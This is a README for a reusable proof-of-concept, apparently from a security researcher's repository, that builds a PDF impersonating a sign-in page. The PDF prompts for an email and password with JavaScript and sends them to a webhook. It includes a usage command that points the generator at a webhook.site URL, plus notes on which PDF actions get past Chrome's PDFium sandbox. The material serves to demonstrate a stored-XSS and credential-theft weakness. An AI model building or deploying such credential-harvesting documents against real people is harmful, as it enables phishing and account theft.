# PDF-XSS PoC (credential theft via PDF form submission)

A minimal, reusable proof-of-concept showing stored XSS in a PDF viewer, where an uploaded PDF executes JavaScript, prompts for credentials, stores them in hidden form fields, and exfiltrates them via the PDF's native `SubmitForm` action.

The exfiltration works in Chrome (the native form-submission engine), not just desktop readers like Acrobat.

## How it works

1. The PDF renders as a normal "sign in to view document" page.
2. `/OpenAction /S /JavaScript` runs two `app.response` prompts (email, then password).
3. The values are written into two hidden AcroForm fields (`email`, `password`).
4. A "View document" button (a `SubmitForm` action) posts those field values to the webhook.

## Usage

```bash
python3 gen_pdf.py "https://webhook.site/your-id" poc.pdf
```

Open `poc.pdf`, type credentials into the two prompts, click "View document", and watch the webhook receive the FDF payload with `email` and `password`.

## Files

- `gen_pdf.py` — the generator (takes the webhook URL as the first argument).
- `pdf-xss-poc.pdf` — a pre-built example with a placeholder webhook.

## Notes

- The submit requires a click; Chrome's PDFium does not fire `SubmitForm` on open or on hover, only on the button click.
- JavaScript `submitForm()` / `launchURL()` are sandboxed and blocked in Chrome, but the `SubmitForm` button action is handled by the native form engine and does fire.
- For authorized testing only.

---

## Author

<p align="left">
  <a href="https://hackerz.space"><img alt="hackerz.space" src="https://img.shields.io/badge/Learn%20Ethical%20Hacking-hackerz.space-00C2FF?style=for-the-badge&logo=bookstack&logoColor=white" /></a>
  <a href="https://buymeacoffee.com/zack0x01"><img alt="Buy Me a Coffee" src="https://img.shields.io/badge/Buy%20Me%20a%20Coffee-zack0x01-FFDD00?style=for-the-badge&logo=buymeacoffee&logoColor=black" /></a>
  <a href="https://youtube.com/@zack0x01"><img alt="YouTube" src="https://img.shields.io/badge/YouTube-zack0x01-FF0000?style=for-the-badge&logo=youtube&logoColor=white" /></a>
  <a href="https://x.com/zack0x01_"><img alt="X" src="https://img.shields.io/badge/X-zack0x01_-000000?style=for-the-badge&logo=x&logoColor=white" /></a>
</p>
